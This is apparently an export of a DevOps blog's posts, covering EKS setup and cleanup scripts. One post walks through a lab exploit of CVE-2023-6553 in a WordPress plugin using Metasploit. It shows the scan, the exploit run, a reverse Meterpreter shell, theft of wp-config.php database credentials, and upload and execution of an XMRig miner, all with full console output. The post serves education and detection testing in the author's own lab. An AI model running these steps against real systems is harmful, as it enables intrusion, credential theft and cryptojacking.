datasource=helm depName=oauth2-proxy registryUrl=https://oauth2-proxy.github.io/manifests OAUTH2_PROXY_HELM_CHART_VERSION=\"7.7.1\" set +x COOKIE_SECRET=\"$(openssl rand -base64 32 | head -c 32 | base64)\" echo \"::add-mask::${COOKIE_SECRET}\" set -x helm repo add --force-update oauth2-proxy https://oauth2-proxy.github.io/manifests tee \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-oauth2-proxy.yml\" &lt;&lt; EOF config: clientID: ${GOOGLE_CLIENT_ID} clientSecret: ${GOOGLE_CLIENT_SECRET} cookieSecret: ${COOKIE_SECRET} configFile: |- cookie_domains = \".${CLUSTER_FQDN}\" set_authorization_header = \"true\" set_xauthrequest = \"true\" upstreams = [ \"file:///dev/null\" ] whitelist_domains = \".${CLUSTER_FQDN}\" authenticatedEmailsFile: enabled: true restricted_access: |- ${MY_EMAIL} ingress: enabled: true className: nginx hosts: - oauth2-proxy.${CLUSTER_FQDN} tls: - hosts: - oauth2-proxy.${CLUSTER_FQDN} metrics: servicemonitor: enabled: true EOF helm upgrade --install --version \"${OAUTH2_PROXY_HELM_CHART_VERSION}\" --namespace oauth2-proxy --create-namespace --values \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-oauth2-proxy.yml\" oauth2-proxy oauth2-proxy/oauth2-proxy kubectl label namespace oauth2-proxy pod-security.kubernetes.io/enforce=baseline Clean-up Remove the EKS cluster and its created components: if eksctl get cluster --name=\"${CLUSTER_NAME}\"; then eksctl delete cluster --name=\"${CLUSTER_NAME}\" --force fi Remove the Route 53 DNS records from the DNS Zone: CLUSTER_FQDN_ZONE_ID=$(aws route53 list-hosted-zones --query \"HostedZones[?Name==\\`${CLUSTER_FQDN}.\\`].Id\" --output text) if [[ -n \"${CLUSTER_FQDN_ZONE_ID}\" ]]; then aws route53 list-resource-record-sets --hosted-zone-id \"${CLUSTER_FQDN_ZONE_ID}\" | jq -c '.ResourceRecordSets[] | select (.Type != \"SOA\" and .Type != \"NS\")' | while read -r RESOURCERECORDSET; do aws route53 change-resource-record-sets \\ --hosted-zone-id \"${CLUSTER_FQDN_ZONE_ID}\" \\ --change-batch '{\"Changes\":[{\"Action\":\"DELETE\",\"ResourceRecordSet\": '\"${RESOURCERECORDSET}\"' }]}' \\ --output text --query 'ChangeInfo.Id' done fi Delete launch templates created by Karpenter: aws ec2 describe-launch-templates --filters \"Name=tag:karpenter.k8s.aws/cluster,Values=${CLUSTER_NAME}\" | jq -r \".LaunchTemplates[].LaunchTemplateName\" | xargs -I{} aws ec2 delete-launch-template --launch-template-name {} Remove volumes and snapshots related to the cluster (as a precaution): for VOLUME in $(aws ec2 describe-volumes --filter \"Name=tag:KubernetesCluster,Values=${CLUSTER_NAME}\" \"Name=tag:kubernetes.io/cluster/${CLUSTER_NAME},Values=owned\" --query 'Volumes[].VolumeId' --output text); do echo \"*** Removing Volume: ${VOLUME}\" aws ec2 delete-volume --volume-id \"${VOLUME}\" done Remove the CloudWatch log group: if [[ \"$(aws logs describe-log-groups --query \"logGroups[?logGroupName==\\`/aws/eks/${CLUSTER_NAME}/cluster\\`] | [0].logGroupName\" --output text)\" = \"/aws/eks/${CLUSTER_NAME}/cluster\" ]]; then aws logs delete-log-group --log-group-name \"/aws/eks/${CLUSTER_NAME}/cluster\" fi Remove any orphan EC2 instances created by Karpenter: for EC2 in $(aws ec2 describe-instances --filters \"Name=tag:kubernetes.io/cluster/${CLUSTER_NAME},Values=owned\" Name=instance-state-name,Values=running --query \"Reservations[].Instances[].InstanceId\" --output text); do echo \"Removing EC2: ${EC2}\" aws ec2 terminate-instances --instance-ids \"${EC2}\" done Remove the CloudFormation stack: aws cloudformation delete-stack --stack-name \"${CLUSTER_NAME}-route53-kms-karpenter\" aws cloudformation wait stack-delete-complete --stack-name \"${CLUSTER_NAME}-route53-kms-karpenter\" aws cloudformation wait stack-delete-complete --stack-name \"eksctl-${CLUSTER_NAME}-cluster\" Remove the ${TMP_DIR}/${CLUSTER_FQDN} directory: if [[ -d \"${TMP_DIR}/${CLUSTER_FQDN}\" ]]; then for FILE in \"${TMP_DIR}/${CLUSTER_FQDN}\"/{kubeconfig-${CLUSTER_NAME}.conf,{aws-cf-route53-kms-karpenter,eksctl-${CLUSTER_NAME},k8s-karpenter-nodepool-ec2nodeclass,helm_values-{aws-ebs-csi-driver,aws-load-balancer-controller,cert-manager,external-dns,forecastle,ingress-nginx,karpenter,kube-prometheus-stack,mailpit,oauth2-proxy},k8s-cert-manager-{certificate,clusterissuer}-staging}.yml}; do if [[ -f \"${FILE}\" ]]; then rm -v \"${FILE}\" else echo \"*** File not found: ${FILE}\" fi done rmdir \"${TMP_DIR}/${CLUSTER_FQDN}\" fi Enjoy … 😉" }, { "title": "Exploit vulnerability in a WordPress plugin with Kali Linux", "url": "/posts/exploit-vulnerability-wordpress-plugin-kali-linux-1/", "categories": "Kubernetes, Cloud, Security", "tags": "amazon-eks, kubernetes, security, exploit, vulnerability, kali-linux, wordpress", "date": "2024-04-27 00:00:00 +0200", "content": "For educational purposes, it can be useful to learn how to exploit a vulnerability in a WordPress plugin running on Amazon EKS using Kali Linux. I will cover the following steps: Install an Amazon EKS cluster Install a vulnerable WordPress application to Kubernetes (K8s) Install Kali Linux on an EC2 instance Exploit a vulnerability in a WordPress plugin using Kali Linux and Metasploit Set necessary environment variables and download CloudFormation templates Requirements: AWS CLI eksctl kubectl helm Set the required AWS environment variables: export AWS_ACCESS_KEY_ID=\"xxxxxxxxxxxxxxxxxx\" export AWS_SECRET_ACCESS_KEY=\"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\" export AWS_DEFAULT_REGION=\"eu-central-1\" AWS_EC2_KEY_PAIR_NAME=\"ruzickap-test\" TMP_DIR=\"${TMP_DIR:-${PWD}}\" Download the CloudFormation templates for Kali Linux and the VPC: wget --continue -q -P \"${TMP_DIR}\" https://raw.githubusercontent.com/aws-samples/aws-codebuild-samples/e43fe99f21b02635873bddeed92b669e8e5156d3/ci_tools/vpc_cloudformation_template.yml wget --continue -q -P \"${TMP_DIR}\" https://raw.githubusercontent.com/aws-samples/amazon-ec2-nice-dcv-samples/b5e676d847da88e95f7227b8da96c2e4f28f88f3/cfn/KaliLinux-NICE-DCV.yaml Create a new AWS EC2 Key Pair: aws ec2 create-key-pair --key-name \"${AWS_EC2_KEY_PAIR_NAME}\" --key-type ed25519 --query \"KeyMaterial\" --output text &gt; \"${TMP_DIR}/${AWS_EC2_KEY_PAIR_NAME}.pem\" chmod 600 \"${TMP_DIR}/${AWS_EC2_KEY_PAIR_NAME}.pem\" Run Kali Linux on Amazon EC2 instance Create an AWS EC2 instance with Kali Linux using the CloudFormation template: export SOLUTION_KALI=\"KaliLinux-NICE-DCV\" aws cloudformation deploy --capabilities CAPABILITY_IAM \\ --parameter-overrides \"EnvironmentName=${SOLUTION_KALI}\" \\ --stack-name \"${SOLUTION_KALI}-VPC\" --template-file \"${TMP_DIR}/vpc_cloudformation_template.yml\" \\ --tags \"Owner=${USER} Environment=dev Solution=${SOLUTION_KALI}\" AWS_CLOUDFORMATION_DETAILS=$(aws cloudformation describe-stacks --stack-name \"${SOLUTION_KALI}-VPC\" --query \"Stacks[0].Outputs[? OutputKey==\\`PublicSubnet1\\` || OutputKey==\\`VPC\\`].{OutputKey:OutputKey,OutputValue:OutputValue}\") AWS_VPC_ID=$(echo \"${AWS_CLOUDFORMATION_DETAILS}\" | jq -r \".[] | select(.OutputKey==\\\"VPC\\\") .OutputValue\") AWS_SUBNET_ID=$(echo \"${AWS_CLOUDFORMATION_DETAILS}\" | jq -r \".[] | select(.OutputKey==\\\"PublicSubnet1\\\") .OutputValue\") eval aws cloudformation create-stack --capabilities CAPABILITY_AUTO_EXPAND CAPABILITY_IAM \\ --parameters \"ParameterKey=ec2KeyPair,ParameterValue=${AWS_EC2_KEY_PAIR_NAME} ParameterKey=vpcID,ParameterValue=${AWS_VPC_ID} ParameterKey=subnetID,ParameterValue=${AWS_SUBNET_ID} ParameterKey=allowWebServerPorts,ParameterValue=HTTP-and-HTTPS\" \\ --stack-name \"${SOLUTION_KALI}\" --template-body \"file://${TMP_DIR}/KaliLinux-NICE-DCV.yaml\" \\ --tags \"Key=Owner,Value=${USER} Key=Environment,Value=dev Key=Solution,Value=${SOLUTION_KALI}\" Install Amazon EKS cluster and vulnerable Wordpress Application Let’s look at how to install the Amazon EKS cluster and the vulnerable WordPress application. Install the Amazon EKS cluster Install the Amazon EKS cluster using eksctl: export SOLUTION_EKS=\"Amazon-EKS\" export KUBECONFIG=\"${TMP_DIR}/kubeconfig-${SOLUTION_EKS}.conf\" eksctl create cluster \\ --name \"${SOLUTION_EKS}\" --tags \"Owner=${USER},Solution=${SOLUTION_EKS},Cluster=${SOLUTION_EKS}\" \\ --node-type t3a.medium --node-volume-size 20 --node-private-networking \\ --kubeconfig \"${KUBECONFIG}\" Install vulnerable Wordpress Application Install the vulnerable WordPress application to the Amazon EKS cluster using a Helm chart, and modify its default values: WORDPRESS_HELM_CHART_VERSION=\"22.1.3\" tee \"${TMP_DIR}/helm_values-wordpress.yml\" &lt;&lt; EOF wordpressUsername: wordpress wordpressPassword: $(openssl rand -base64 12) customPostInitScripts: install_plugins.sh: | wp plugin install backup-backup --version=1.3.7 --activate persistence: enabled: false mariadb: primary: persistence: enabled: false EOF helm upgrade --install --version \"${WORDPRESS_HELM_CHART_VERSION}\" --namespace wordpress --create-namespace --wait --values \"${TMP_DIR}/helm_values-wordpress.yml\" wordpress oci://registry-1.docker.io/bitnamicharts/wordpress Version 1.3.7 of the vulnerable WordPress Backup Migration Plugin was installed. Let’s get the LoadBalancer / WordPress URL: K8S_WORDPRESS_SERVICE=$(kubectl get services --namespace wordpress wordpress --output jsonpath='{.status.loadBalancer.ingress[0].hostname}') Summarize the WordPress URL, Admin URL, Username, and Password: echo \"WordPress URL: http://${K8S_WORDPRESS_SERVICE}/\" echo \"WordPress Admin URL: http://${K8S_WORDPRESS_SERVICE}/admin\" echo \"Username: wordpress\" echo \"Password: $(kubectl get secret --namespace wordpress wordpress -o jsonpath='{.data.wordpress-password}' | base64 -d)\" WordPress URL: http://ab5bc303e73b84fd597cb02c422e1f23-691116016.eu-central-1.elb.amazonaws.com/ WordPress Admin URL: http://ab5bc303e73b84fd597cb02c422e1f23-691116016.eu-central-1.elb.amazonaws.com/admin Username: wordpress Password: a6jnQ16JZS5TLLri Attack the Wordpress Application The following commands run the Metasploit Framework to exploit a vulnerability in the WordPress Backup Migration Plugin. Details about the vulnerability can be found here: WordPress Backup Migration Plugin PHP Filter Chain RCE Vulnerability Details : CVE-2023-6553 CVE-2023-6553 Exploit V2 CVE-2023-6553 Detail Allow your user to connect using SSH: AWS_EC2_KALI_LINUX_PUBLIC_IP=$(aws ec2 describe-instances --filters \"Name=tag:Solution,Values=${SOLUTION_KALI}\" --query \"Reservations[].Instances[].PublicIpAddress\" --output text) ssh -i \"${TMP_DIR}/${AWS_EC2_KEY_PAIR_NAME}.pem\" -o StrictHostKeyChecking=no \"kali@${AWS_EC2_KALI_LINUX_PUBLIC_IP}\" 'curl -Ls https://github.com/ruzickap.keys &gt;&gt; ~/.ssh/authorized_keys' Log in to the Kali Linux instance using SSH and perform the following steps: Download the XMRig cryptominer Install Metasploit Framework Initialize the Metasploit Framework Use wordpress_scanner auxiliary module to scan the WordPress Application Use wp_backup_migration_php_filter exploit module to exploit the WordPress plugin vulnerability Upload the cryptominer to the remote host Execute the cryptominer (run the XMRig binary with the --version option) Download the WordPress config file wp-config.php and print the database credentials Metasploit logo # shellcheck disable=SC2087 ssh -i \"${TMP_DIR}/${AWS_EC2_KEY_PAIR_NAME}.pem\" -o StrictHostKeyChecking=no \"kali@${AWS_EC2_KALI_LINUX_PUBLIC_IP}\" &lt;&lt; EOF2 curl -Ls https://github.com/xmrig/xmrig/releases/download/v6.21.3/xmrig-6.21.3-linux-static-x64.tar.gz | tar -xvzf - --strip-components=1 --wildcards \"*/xmrig\" sudo snap install metasploit-framework msfdb init cat &lt;&lt; EOF | msfconsole --quiet --resource - use auxiliary/scanner/http/wordpress_scanner set rhost ${K8S_WORDPRESS_SERVICE} run use exploit/multi/http/wp_backup_migration_php_filter set rhost ${K8S_WORDPRESS_SERVICE} set lhost ${AWS_EC2_KALI_LINUX_PUBLIC_IP} set lport 443 run sessions --interact 1 --meterpreter-command ps --meterpreter-command sysinfo \\ --meterpreter-command \"download /bitnami/wordpress/wp-config.php\" \\ --meterpreter-command \"upload xmrig /tmp/xmrig\" \\ --meterpreter-command \"execute -i -H -f /usr/bin/sh -a '-c \\\"chmod a+x /tmp/xmrig ; /tmp/xmrig --version\\\"'\" exit -y EOF grep DB_ wp-config.php EOF2 ┌──(kali㉿kali)-[~] └─$ curl -Ls https://github.com/xmrig/xmrig/releases/download/v6.21.3/xmrig-6.21.3-linux-static-x64.tar.gz | tar -xvzf - --strip-components=1 --wildcards \"*/xmrig\" xmrig-6.21.3/xmrig ┌──(kali㉿kali)-[~] └─$ sudo snap install metasploit-framework metasploit-framework v6.4.4-dev from Jitendra Patro (jitpatro) installed WARNING: There is 1 new warning. See 'snap warnings'. ┌──(kali㉿kali)-[~] └─$ msfdb init Running the 'init' command for the database: Creating database at /home/kali/snap/metasploit-framework/common/.msf4/db Creating db socket file at /home/kali/snap/metasploit-framework/common Starting database at /home/kali/snap/metasploit-framework/common/.msf4/db...server starting success Creating database users Writing client authentication configuration file /home/kali/snap/metasploit-framework/common/.msf4/db/pg_hba.conf Stopping database at /home/kali/snap/metasploit-framework/common/.msf4/db Starting database at /home/kali/snap/metasploit-framework/common/.msf4/db...server starting success Creating initial database schema Database initialization successful ┌──(kali㉿kali)-[~] └─$ msfconsole --quiet ** Welcome to Metasploit Framework Initial Setup ** Please answer a few questions to get started. ** Metasploit Framework Initial Setup Complete ** This copy of metasploit-framework is more than two weeks old. Consider running 'msfupdate' to update to the latest version. msf6 &gt; use auxiliary/scanner/http/wordpress_scanner msf6 auxiliary(scanner/http/wordpress_scanner) &gt; set rhost ab5bc303e73b84fd597cb02c422e1f23-691116016.eu-central-1.elb.amazonaws.com rhost =&gt; ab5bc303e73b84fd597cb02c422e1f23-691116016.eu-central-1.elb.amazonaws.com msf6 auxiliary(scanner/http/wordpress_scanner) &gt; run [*] Trying 3.73.29.183 [+] 3.73.29.183 - Detected Wordpress 6.5 [*] 3.73.29.183 - Enumerating Themes [*] 3.73.29.183 - Progress 0/3 (0.0%) [*] 3.73.29.183 - Finished scanning themes [*] 3.73.29.183 - Enumerating plugins [*] 3.73.29.183 - Progress 0/63 (0.0%) [+] 3.73.29.183 - Detected plugin: all-in-one-wp-migration version 7.81 [+] 3.73.29.183 - Detected plugin: backup-backup version 1.3.7 [*] 3.73.29.183 - Finished scanning plugins [*] 3.73.29.183 - Searching Users [+] 3.73.29.183 - Detected user: wordpress with username: wordpress [*] 3.73.29.183 - Finished scanning users [*] 3.73.29.183 - Finished all scans [*] Scanned 1 of 2 hosts (50% complete) [*] Trying 3.120.25.116 [+] 3.120.25.116 - Detected Wordpress 6.5 [*] 3.120.25.116 - Enumerating Themes [*] 3.120.25.116 - Progress 0/3 (0.0%) [*] Scanned 1 of 2 hosts (50% complete) [*] Scanned 1 of 2 hosts (50% complete) [*] 3.120.25.116 - Finished scanning themes [*] 3.120.25.116 - Enumerating plugins [*] 3.120.25.116 - Progress 0/63 (0.0%) [*] Scanned 1 of 2 hosts (50% complete) [*] Scanned 1 of 2 hosts (50% complete) [+] 3.120.25.116 - Detected plugin: all-in-one-wp-migration version 7.81 [+] 3.120.25.116 - Detected plugin: backup-backup version 1.3.7 [*] 3.120.25.116 - Finished scanning plugins [*] 3.120.25.116 - Searching Users [+] 3.120.25.116 - Detected user: wordpress with username: wordpress [*] 3.120.25.116 - Finished scanning users [*] 3.120.25.116 - Finished all scans [*] Scanned 2 of 2 hosts (100% complete) [*] Auxiliary module execution completed msf6 auxiliary(scanner/http/wordpress_scanner) &gt; msf6 auxiliary(scanner/http/wordpress_scanner) &gt; use exploit/multi/http/wp_backup_migration_php_filter [*] Using configured payload php/meterpreter/reverse_tcp msf6 exploit(multi/http/wp_backup_migration_php_filter) &gt; set rhost ab5bc303e73b84fd597cb02c422e1f23-691116016.eu-central-1.elb.amazonaws.com rhost =&gt; ab5bc303e73b84fd597cb02c422e1f23-691116016.eu-central-1.elb.amazonaws.com msf6 exploit(multi/http/wp_backup_migration_php_filter) &gt; set lhost 52.57.50.4 lhost =&gt; 52.57.50.4 msf6 exploit(multi/http/wp_backup_migration_php_filter) &gt; set lport 443 lport =&gt; 443 msf6 exploit(multi/http/wp_backup_migration_php_filter) &gt; run [*] Exploiting target 3.73.29.183 [-] Handler failed to bind to 52.57.50.4:443:- - [*] Started reverse TCP handler on 0.0.0.0:443 [*] Running automatic check (\"set AutoCheck false\" to disable) [*] WordPress Version: 6.5 [+] Detected Backup Migration Plugin version: 1.3.7 [+] The target appears to be vulnerable. [*] Writing the payload to disk, character by character, please wait... [*] Sending stage (39927 bytes) to 3.74.38.166 [+] Deleted j [+] Deleted erpY.php [*] Meterpreter session 1 opened (10.192.10.73:443 -&gt; 3.74.38.166:38454) at 2024-04-30 07:08:44 +0000 [*] Session 1 created in the background. [*] Exploiting target 3.120.25.116 [-] Handler failed to bind to 52.57.50.4:443:- - [*] Started reverse TCP handler on 0.0.0.0:443 [*] Running automatic check (\"set AutoCheck false\" to disable) [*] WordPress Version: 6.5 [+] Detected Backup Migration Plugin version: 1.3.7 [+] The target appears to be vulnerable. [*] Writing the payload to disk, character by character, please wait... [*] Sending stage (39927 bytes) to 3.74.38.166 [+] Deleted t [+] Deleted erpY.php [*] Meterpreter session 2 opened (10.192.10.73:443 -&gt; 3.74.38.166:43951) at 2024-04-30 07:09:43 +0000 [*] Session 2 created in the background. msf6 exploit(multi/http/wp_backup_migration_php_filter) &gt; msf6 exploit(multi/http/wp_backup_migration_php_filter) &gt; sessions --interact 1 [*] Starting interaction with 1... meterpreter &gt; ps Process List ============ PID Name User Path --- ---- ---- ---- 1 /opt/bitnami/apache/bin/httpd 1001 /opt/bitnami/apache/bin/httpd -f /opt/bitnami/apache/conf/httpd.conf -D FOREGROUND 301 /opt/bitnami/apache/bin/httpd 1001 /opt/bitnami/apache/bin/httpd -f /opt/bitnami/apache/conf/httpd.conf -D FOREGROUND 302 /opt/bitnami/apache/bin/httpd 1001 /opt/bitnami/apache/bin/httpd -f /opt/bitnami/apache/conf/httpd.conf -D FOREGROUND 303 /opt/bitnami/apache/bin/httpd 1001 /opt/bitnami/apache/bin/httpd -f /opt/bitnami/apache/conf/httpd.conf -D FOREGROUND 304 /opt/bitnami/apache/bin/httpd 1001 /opt/bitnami/apache/bin/httpd -f /opt/bitnami/apache/conf/httpd.conf -D FOREGROUND 305 /opt/bitnami/apache/bin/httpd 1001 /opt/bitnami/apache/bin/httpd -f /opt/bitnami/apache/conf/httpd.conf -D FOREGROUND 306 /opt/bitnami/apache/bin/httpd 1001 /opt/bitnami/apache/bin/httpd -f /opt/bitnami/apache/conf/httpd.conf -D FOREGROUND 308 /opt/bitnami/apache/bin/httpd 1001 /opt/bitnami/apache/bin/httpd -f /opt/bitnami/apache/conf/httpd.conf -D FOREGROUND 309 /opt/bitnami/apache/bin/httpd 1001 /opt/bitnami/apache/bin/httpd -f /opt/bitnami/apache/conf/httpd.conf -D FOREGROUND 310 /opt/bitnami/apache/bin/httpd 1001 /opt/bitnami/apache/bin/httpd -f /opt/bitnami/apache/conf/httpd.conf -D FOREGROUND 311 sh 1001 sh -c ps ax -w -o pid,user,cmd --no-header 2&gt;/dev/null 312 ps 1001 ps ax -w -o pid,user,cmd --no-header meterpreter &gt; meterpreter &gt; sysinfo Computer : wordpress-7c5479f8-n846l OS : Linux wordpress-7c5479f8-n846l 5.10.213-201.855.amzn2.x86_64 #1 SMP Mon Mar 25 18:16:11 UTC 2024 x86_64 Meterpreter : php/linux meterpreter &gt; meterpreter &gt; download /bitnami/wordpress/wp-config.php [*] Downloading: /bitnami/wordpress/wp-config.php -&gt; /home/kali/wp-config.php [*] Downloaded 4.19 KiB of 4.19 KiB (100.0%): /bitnami/wordpress/wp-config.php -&gt; /home/kali/wp-config.php [*] Completed : /bitnami/wordpress/wp-config.php -&gt; /home/kali/wp-config.php meterpreter &gt; meterpreter &gt; upload xmrig /tmp/xmrig [*] Uploading : /home/kali/xmrig -&gt; /tmp/xmrig [*] Uploaded -1.00 B of 7.90 MiB (0.0%): /home/kali/xmrig -&gt; /tmp/xmrig [*] Completed : /home/kali/xmrig -&gt; /tmp/xmrig meterpreter &gt; meterpreter &gt; execute -i -H -f /usr/bin/sh -a '-c \"chmod a+x /tmp/xmrig ; /tmp/xmrig --version\"' Process 316 created. Channel 3 created. XMRig 6.21.3 built on Apr 23 2024 with GCC 13.2.1 features: 64-bit AES libuv/1.48.0 OpenSSL/3.0.13 hwloc/2.10.0 [-] core_channel_interact: Operation failed: 1 meterpreter &gt; exit -y [*] Shutting down session: 1 [*] 3.73.29.183 - Meterpreter session 1 closed. Reason: User exit msf6 exploit(multi/http/wp_backup_migration_php_filter) &gt; exit -y ┌──(kali㉿kali)-[~] └─$ grep DB_ wp-config.php define( 'DB_NAME', 'bitnami_wordpress' ); define( 'DB_USER', 'bn_wordpress' ); define( 'DB_PASSWORD', 'vAX0wwd3wR' ); define( 'DB_HOST', 'wordpress-mariadb:3306' ); define( 'DB_CHARSET', 'utf8' ); define( 'DB_COLLATE', '' ); I really like Metasploit’s colors, so I’ve added the logs as images here: Metasploit - wordpress_scanner Metasploit - wp_backup_migration_php_filter The Metasploit Framework can do many other things with an exploited host. These are basic commands that should be detected by security tools (e.g., Kubernetes runtime protection). Cleanup Delete the Amazon EKS cluster, the Kali Linux EC2 instance, and the EC2 Key Pair: export AWS_DEFAULT_REGION=\"eu-central-1\" export AWS_EC2_KEY_PAIR_NAME=\"ruzickap-test\" export SOLUTION_KALI=\"KaliLinux-NICE-DCV\" export SOLUTION_EKS=\"Amazon-EKS\" export TMP_DIR=\"${TMP_DIR:-${PWD}/tmp}\" export KUBECONFIG=\"${TMP_DIR}/kubeconfig-${SOLUTION_EKS}.conf\" aws cloudformation delete-stack --stack-name \"${SOLUTION_KALI}\" aws ec2 delete-key-pair --key-name \"${AWS_EC2_KEY_PAIR_NAME}\" if eksctl get cluster --name=\"${SOLUTION_EKS}\"; then eksctl delete cluster --name=\"${SOLUTION_EKS}\" --force fi aws cloudformation delete-stack --stack-name \"${SOLUTION_KALI}-VPC\" for FILE in ${TMP_DIR}/{vpc_cloudformation_template.yml,KaliLinux-NICE-DCV.yaml,${AWS_EC2_KEY_PAIR_NAME}.pem,helm_values-wordpress.yml,kubeconfig-${SOLUTION_EKS}.conf}; do if [[ -f \"${FILE}\" ]]; then rm -v \"${FILE}\" else echo \"*** File not found: ${FILE}\" fi done aws cloudformation wait stack-delete-complete --stack-name \"${SOLUTION_KALI}\" aws cloudformation wait stack-delete-complete --stack-name \"${SOLUTION_KALI}-VPC\" aws cloudformation wait stack-delete-complete --stack-name \"eksctl-${SOLUTION_EKS}-cluster\" Enjoy … 😉" }, { "title": "Build secure and cheap Amazon EKS", "url": "/posts/secure-cheap-amazon-eks/", "categories": "Kubernetes, Cloud, Security", "tags": "amazon-eks, kubernetes, security, eksctl, cert-manager, external-dns, prometheus", "date": "2023-09-25 00:00:00 +0200", "content": "I will outline the steps for setting up an Amazon EKS environment that is both cost-effective and prioritizes security, including the configuration of standard applications. The Amazon EKS setup should align with the following cost-effectiveness criteria: Utilize two Availability Zones (AZs), or a single zone if possible, to reduce payments for cross-AZ traffic Spot instances Less expensive region - us-east-1 Most price efficient EC2 instance type t4g.medium (2 x CPU, 4GB RAM) using AWS Graviton based on ARM Use Bottlerocket OS for a minimal operating system, CPU, and memory footprint Use Network Load Balancer (NLB) as a most cost efficient + cost optimized load balancer Karpenter to enable automatic node scaling that matches the specific resource requirements of pods The Amazon EKS setup should also meet the following security requirements: The Amazon EKS control plane must be encrypted using KMS Worker node EBS volumes must be encrypted Cluster logging to CloudWatch must be configured Network Policies should be enabled where supported Build Amazon EKS cluster Requirements You will need to configure the AWS CLI and set up other necessary secrets and variables. # AWS Credentials export AWS_ACCESS_KEY_ID=\"xxxxxxxxxxxxxxxxxx\" export AWS_SECRET_ACCESS_KEY=\"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\" export AWS_SESSION_TOKEN=\"xxxxxxxx\" export AWS_ROLE_TO_ASSUME=\"arn:aws:iam::7xxxxxxxxxx7:role/Gixxxxxxxxxxxxxxxxxxxxle\" export GOOGLE_CLIENT_ID=\"10xxxxxxxxxxxxxxxud.apps.googleusercontent.com\" export GOOGLE_CLIENT_SECRET=\"GOxxxxxxxxxxxxxxxtw\" If you plan to follow this document and its tasks, you will need to set up a few environment variables, such as: # AWS Region export AWS_DEFAULT_REGION=\"${AWS_DEFAULT_REGION:-us-east-1}\" # Hostname / FQDN definitions export CLUSTER_FQDN=\"${CLUSTER_FQDN:-k01.k8s.mylabs.dev}\" # Base Domain: k8s.mylabs.dev export BASE_DOMAIN=\"${CLUSTER_FQDN#*.}\" # Cluster Name: k01 export CLUSTER_NAME=\"${CLUSTER_FQDN%%.*}\" export MY_EMAIL=\"petr.ruzicka@gmail.com\" export TMP_DIR=\"${TMP_DIR:-${PWD}/tmp}\" export KUBECONFIG=\"${KUBECONFIG:-${TMP_DIR}/${CLUSTER_FQDN}/kubeconfig-${CLUSTER_NAME}.conf}\" # Tags used to tag the AWS resources export TAGS=\"${TAGS:-Owner=${MY_EMAIL},Environment=dev,Cluster=${CLUSTER_FQDN}}\" AWS_ACCOUNT_ID=$(aws sts get-caller-identity --query \"Account\" --output text) &amp;&amp; export AWS_ACCOUNT_ID mkdir -pv \"${TMP_DIR}/${CLUSTER_FQDN}\" Confirm that all essential variables have been properly configured: : \"${AWS_ACCESS_KEY_ID?}\" : \"${AWS_DEFAULT_REGION?}\" : \"${AWS_SECRET_ACCESS_KEY?}\" : \"${AWS_ROLE_TO_ASSUME?}\" : \"${GOOGLE_CLIENT_ID?}\" : \"${GOOGLE_CLIENT_SECRET?}\" echo -e \"${MY_EMAIL} | ${CLUSTER_NAME} | ${BASE_DOMAIN} | ${CLUSTER_FQDN}\\n${TAGS}\" Install the required tools: You can bypass these procedures if you already have all the essential software installed. AWS CLI eksctl kubectl helm Configure AWS Route 53 Domain delegation The DNS delegation tasks should be executed as a one-time operation. Create a DNS zone for the EKS clusters: export CLOUDFLARE_EMAIL=\"petr.ruzicka@gmail.com\" export CLOUDFLARE_API_KEY=\"1xxxxxxxxx0\" aws route53 create-hosted-zone --output json \\ --name \"${BASE_DOMAIN}\" \\ --caller-reference \"$(date)\" \\ --hosted-zone-config=\"{\\\"Comment\\\": \\\"Created by petr.ruzicka@gmail.com\\\", \\\"PrivateZone\\\": false}\" | jq Route53 k8s.mylabs.dev zone Utilize your domain registrar to update the nameservers for your zone (e.g., mylabs.dev) to point to the Amazon Route 53 nameservers. Here’s how to discover the required Route 53 nameservers: NEW_ZONE_ID=$(aws route53 list-hosted-zones --query \"HostedZones[?Name==\\`${BASE_DOMAIN}.\\`].Id\" --output text) NEW_ZONE_NS=$(aws route53 get-hosted-zone --output json --id \"${NEW_ZONE_ID}\" --query \"DelegationSet.NameServers\") NEW_ZONE_NS1=$(echo \"${NEW_ZONE_NS}\" | jq -r \".[0]\") NEW_ZONE_NS2=$(echo \"${NEW_ZONE_NS}\" | jq -r \".[1]\") Establish the NS record in k8s.mylabs.dev (your BASE_DOMAIN) for proper zone delegation. This operation’s specifics may vary based on your domain registrar; I use Cloudflare and employ Ansible for automation: ansible -m cloudflare_dns -c local -i \"localhost,\" localhost -a \"zone=mylabs.dev record=${BASE_DOMAIN} type=NS value=${NEW_ZONE_NS1} solo=true proxied=no account_email=${CLOUDFLARE_EMAIL} account_api_token=${CLOUDFLARE_API_KEY}\" ansible -m cloudflare_dns -c local -i \"localhost,\" localhost -a \"zone=mylabs.dev record=${BASE_DOMAIN} type=NS value=${NEW_ZONE_NS2} solo=false proxied=no account_email=${CLOUDFLARE_EMAIL} account_api_token=${CLOUDFLARE_API_KEY}\" localhost | CHANGED =&gt; { \"ansible_facts\": { \"discovered_interpreter_python\": \"/usr/bin/python\" }, \"changed\": true, \"result\": { \"record\": { \"content\": \"ns-885.awsdns-46.net\", \"created_on\": \"2020-11-13T06:25:32.18642Z\", \"id\": \"dxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxb\", \"locked\": false, \"meta\": { \"auto_added\": false, \"managed_by_apps\": false, \"managed_by_argo_tunnel\": false, \"source\": \"primary\" }, \"modified_on\": \"2020-11-13T06:25:32.18642Z\", \"name\": \"k8s.mylabs.dev\", \"proxiable\": false, \"proxied\": false, \"ttl\": 1, \"type\": \"NS\", \"zone_id\": \"2xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxe\", \"zone_name\": \"mylabs.dev\" } } } localhost | CHANGED =&gt; { \"ansible_facts\": { \"discovered_interpreter_python\": \"/usr/bin/python\" }, \"changed\": true, \"result\": { \"record\": { \"content\": \"ns-1692.awsdns-19.co.uk\", \"created_on\": \"2020-11-13T06:25:37.605605Z\", \"id\": \"9xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxb\", \"locked\": false, \"meta\": { \"auto_added\": false, \"managed_by_apps\": false, \"managed_by_argo_tunnel\": false, \"source\": \"primary\" }, \"modified_on\": \"2020-11-13T06:25:37.605605Z\", \"name\": \"k8s.mylabs.dev\", \"proxiable\": false, \"proxied\": false, \"ttl\": 1, \"type\": \"NS\", \"zone_id\": 